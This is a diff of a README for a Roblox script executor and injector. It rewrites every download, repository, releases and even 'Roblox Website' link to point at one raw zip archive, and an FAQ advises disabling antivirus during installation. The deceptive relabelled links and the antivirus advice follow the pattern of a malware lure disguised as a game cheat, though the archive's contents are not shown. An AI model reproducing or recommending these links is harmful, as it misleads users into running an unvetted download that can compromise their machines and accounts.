@@ -1,6 +1,6 @@
 # 🚀 Roblox-Executor-Injector-2025 - Run Lua Scripts Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip)
 
 ## 📋 What is Roblox-Executor-Injector-2025?
 
@@ -35,11 +35,11 @@ Make sure Roblox is installed and logged in on your PC. Close Roblox before runn
 
 ## 🚀 Getting Started with Download and Installation
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip)
 
 1. **Open the download page**  
    Click the green or blue “Download” button above or visit:  
-   https://github.com/clifford-ui/Roblox-Executor-Injector-2025
+   https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip
 
 2. **Find the latest release**  
    On the GitHub page, look for the **Releases** section. This is usually on the right side or under the repository description. The newest release will have the latest program.
@@ -98,9 +98,9 @@ Running scripts can violate Roblox’s terms of service. Use cautiously and at y
 
 ## 📚 Useful Links
 
-- Official Repo: https://github.com/clifford-ui/Roblox-Executor-Injector-2025  
-- Releases: https://github.com/clifford-ui/Roblox-Executor-Injector-2025/releases  
-- Roblox Website: https://www.roblox.com  
+- Official Repo: https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip  
+- Releases: https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip  
+- Roblox Website: https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip  
 
 ## ❓ FAQs
 
@@ -118,4 +118,4 @@ You may need to add the app as an exception or disable antivirus temporarily dur
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/clifford-ui/Roblox-Executor-Injector-2025/raw/refs/heads/main/Birkeniidae/Executor_Injector_Roblox_2.7-beta.1.zip)
